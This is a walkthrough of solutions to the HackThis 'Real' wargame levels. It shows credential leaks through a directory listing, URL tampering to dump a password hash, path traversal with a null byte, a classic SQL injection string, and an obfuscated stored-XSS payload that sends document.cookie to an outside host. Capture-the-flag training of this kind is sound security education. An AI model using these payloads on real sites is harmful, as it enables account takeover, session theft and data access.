# Real Levels
## Real 1
Always check deleted folder!
## Real 2
Inspect source code and find the JS.
```javascript
var username= document.getElementById('username').value;
	var password= document.getElementById('password').value;
	URL= "members/" + username + " " + password + ".htm";
	path = URL;
```
This seems interesting. Navigate to ```/members``` abd get the dir listing.
```
Index of /levels/extras/real/2/members/

../
anna god.htm                                       28-Nov-2014 12:27                   0
dave fish_r_friends.htm                            28-Nov-2014 12:27                   0
jack kack.htm                                      28-Nov-2014 12:27                   0
librarian sweetlittlebooks.htm                     28-Nov-2014 12:27                   0
luke 9312.htm                                      28-Nov-2014 12:27                   0
```
Log in as the librarian.
## Real 3
Discover login.js file.
```javascript
m[m.length] = new Array("66913", "78323683", "Ksrg", "/oiAguA/ykdp/8?rF=xhyvAttm");
m[m.length] = new Array("644543", "859223813", "Krteb", "/ohCeux/rlho/6?ww=wjwzohhw");
m[m.length] = new Array("16130", "78323683", "Osqqrxz", "kxyr://FED.mrslnn.kvs");
```
This can be decoded by brute force, however the easier method would be to fuzz the directory for other js files and ultimately land on [members.js](https://www.hackthis.co.uk/levels/extras/real/3/members.js)

## Real 4
- Access PlanetBid with and admin account with a password list
- Get members db and bid db, which helps to find that Revoked.Mayhem’s id is ```31``` and email is ```Caffe@hotbiz.com```
- The only transaction for the user is involves id ```11``` - ```nemisis:jfelliot@mail.com```
- Get nemisis' password hash from members db by modifying the URL from ```?members&1=user&2=email``` to ```members&1=user&2=pass```. Click "clear logs".
- MD5 hash is ```742929dcb631403d7c1c1efad2ca2700```
- Log in to email client with found credentials, find an email with Safe Transfer account details
- Log in to Transfer, send the $$$ back to 64957746

## Real 5

Pages are displayed using GET, e.g. ?p=index

Changing p to random stuff gets this (?p=lul)
```
Warning: file_get_contents(lul.html) [function.file-get-contents]: failed to open stream: No such file or directory in pages on line 22
```
Trying to access the source code for admin.php with ?p=../admin.php

```Warning: file_get_contents(../admin.php.html) ```

Using null byte to escape the parameter before '.html' - ?p=admin.php%00

```php
<?php
if(isset($_GET['password']) ){
		if( $_GET['password'] == 'princesslovetoast' ){
			header("Location: /levels/real/5?p=princesslovetoast");
		}
}?>
```
## Real Xmas

Letter form sends a POST request to mod.php?submit.
Getting rid of submit takes to login page.
Simple SQLi does the trick.
```
SELECT * FROM users WHERE name = '' OR '1'='1';
```
Open index.php and paste the code from the alternative source.

## Real 6

Upload t.php to your server.
```
http://skreamdev.com/t.php?c=*cookie*
```
Post to the form line by line from bottom to top.

```html
<script>/*\
*/var i=new Image();/*\
*/i.src="http://skr"+/*\
*/"eamdev.com"+/*\
*/"/t.php?c"+/*\
*/"="+document.cookie;/*\
*/</script>
```
Wait for the vicim to visit the page and collect the flag.
